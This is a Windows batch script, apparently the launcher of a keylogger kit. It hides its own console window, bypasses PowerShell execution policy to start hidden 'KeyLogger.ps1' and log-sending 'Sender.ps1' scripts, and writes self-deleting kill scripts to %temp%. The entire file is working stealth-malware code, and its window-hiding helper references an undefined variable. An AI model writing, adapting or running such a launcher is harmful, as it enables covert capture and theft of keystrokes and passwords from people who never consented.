@echo off
:: UltimateStealthRunner.bat - Completely hidden launcher (non-self-deleting version)
if "%1" == "hidden" goto :main

:: First self-launch in hidden mode
powershell -window hidden -command "Start-Process cmd.exe -ArgumentList '/c','%~f0','hidden' -WindowStyle Hidden"
exit

:main
:: Create window hiding PowerShell code
echo [DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state); > "%temp%\hide.ps1"
echo add-type -name win -memberDefinition $t -namespace native >> "%temp%\hide.ps1"
echo [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() ^| Get-Process).MainWindowHandle, 0) >> "%temp%\hide.ps1"

:: Launch keylogger (completely hidden)
powershell -executionpolicy bypass -windowstyle hidden -command "& {. '%temp%\hide.ps1'; Start-Process powershell.exe -ArgumentList '-nologo','-windowstyle','hidden','-executionpolicy','bypass','-file','%~dp0KeyLogger.ps1' -WindowStyle Hidden}"

:: Wait 2 seconds
powershell -command "Start-Sleep -Seconds 2"

:: Launch log sender (completely hidden)
powershell -executionpolicy bypass -windowstyle hidden -command "& {. '%temp%\hide.ps1'; Start-Process powershell.exe -ArgumentList '-nologo','-windowstyle','hidden','-executionpolicy','bypass','-file','%~dp0Sender.ps1' -WindowStyle Hidden}"

:: Create kill script (hidden version)
echo @echo off > "%temp%\kill_hidden.bat"
echo taskkill /f /im powershell.exe /t >> "%temp%\kill_hidden.bat"
echo taskkill /f /im cmd.exe /t >> "%temp%\kill_hidden.bat"
echo del "%temp%\hide.ps1" >> "%temp%\kill_hidden.bat"
echo start /b "" cmd /c del "%%~f0" ^& exit >> "%temp%\kill_hidden.bat"

:: Create visible kill script (optional)
echo @echo off > "kill_visible.bat"
echo echo Terminating all hidden processes... >> "kill_visible.bat"
echo call "%temp%\kill_hidden.bat" >> "kill_visible.bat"
echo echo All components terminated. >> "kill_visible.bat"
echo pause >> "kill_visible.bat"

exit